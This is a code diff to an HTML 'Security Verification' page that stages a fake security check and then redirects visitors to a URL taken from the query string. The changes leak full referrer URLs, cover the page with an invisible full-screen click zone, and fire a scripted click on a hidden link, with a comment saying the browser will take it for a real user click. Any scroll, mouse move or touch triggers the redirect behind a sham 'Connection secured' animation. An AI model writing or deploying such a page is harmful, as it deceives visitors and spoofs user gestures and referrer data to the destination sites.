@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="referrer" content="origin"> <title>Security Verification</title>
+    <meta name="referrer" content="unsafe-url"> 
+    <title>Security Verification</title>
     <style>
         body { 
             margin: 0; padding: 0; 
@@ -69,9 +70,16 @@
         }
         .blink { animation: blinker 2s linear infinite; }
         @keyframes blinker { 50% { opacity: 0.5; } }
+        
+        /* Full Screen Click Zone */
+        .tap-zone { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; cursor: pointer; }
     </style>
 </head>
 <body>
+
+    <a id="hidden-link" href="#" style="display:none;"></a>
+
+    <div class="tap-zone" id="clickArea"></div>
 
     <div class="overlay">
         <div class="popup-card">
@@ -83,7 +91,7 @@
             <p id="statusMsg">Move cursor or scroll to continue.</p>
             <div class="loader-bar" id="loader"><div class="progress" id="progressBar"></div></div>
             
-            <div class="interaction-hint blink">
+            <div class="interaction-hint blink" id="hint">
                 <span>Waiting for interaction...</span>
             </div>
         </div>
@@ -91,35 +99,44 @@
 
     <script>
         const params = new URLSearchParams(window.location.search);
-        const targetUrl = params.get('url');
+        let targetUrl = params.get('url');
         let verified = false;
 
-        // Function: Runs on Scroll, Move, Touch
+        // FIX 3: URL Cleaner (Decode + Remove m=1)
+        if (targetUrl) {
+            try {
+                targetUrl = decodeURIComponent(targetUrl);
+                targetUrl = targetUrl.replace(/[?&]m=1/, ''); 
+            } catch (e) { console.log('URL Error'); }
+        }
+
         function verifyAndRedirect() {
             if (verified) return;
             verified = true;
 
             if (targetUrl) {
-                // 1. UI Update: Show "Verifying"
+                // UI Animation (Same as before)
                 document.getElementById('statusTitle').innerText = "Verifying...";
                 document.getElementById('statusMsg').innerText = "Connection secured. Redirecting...";
-                document.querySelector('.interaction-hint').style.display = 'none';
+                document.getElementById('hint').style.display = 'none';
                 document.getElementById('loader').style.display = 'block';
                 
-                // 2. Icon Turns Green
+                // Colors
                 document.getElementById('iconBox').style.background = "#dff9fb";
-                document.querySelector('.shield-icon svg').style.fill = "#00b894"; // Green
+                document.querySelector('.shield-icon svg').style.fill = "#00b894";
 
-                // 3. Progress Bar Fill
+                // Progress Bar
                 setTimeout(() => { document.getElementById('progressBar').style.width = "100%"; }, 100);
 
-                // 4. Add 'auth' param & Redirect
+                // Add Auth Param
                 const separator = targetUrl.includes('?') ? '&' : '?';
                 const finalDest = targetUrl + separator + 'auth=verified';
 
-                // 800ms Delay for realism
+                // FIX 4: Real Click Simulation (Referrer Pass Hoga)
                 setTimeout(() => {
-                    window.location.href = finalDest;
+                    let link = document.getElementById('hidden-link');
+                    link.href = finalDest;
+                    link.click(); // Browser ko lagega user ne click kiya hai
                 }, 800);
             } else {
                 document.getElementById('statusTitle').innerText = "Link Error";
@@ -128,9 +145,11 @@
             }
         }
 
-        // Trigger on ANY activity
-        const events = ['mousemove', 'scroll', 'click', 'touchstart', 'keydown', 'wheel'];
-        events.forEach(evt => {
+        // Trigger on ANY activity (Mobile & Desktop)
+        document.getElementById('clickArea').addEventListener('click', verifyAndRedirect);
+        document.getElementById('clickArea').addEventListener('touchstart', verifyAndRedirect, {passive: true});
+        
+        ['mousemove', 'scroll', 'keydown', 'wheel'].forEach(evt => {
             window.addEventListener(evt, verifyAndRedirect, { once: true });
         });
     </script>
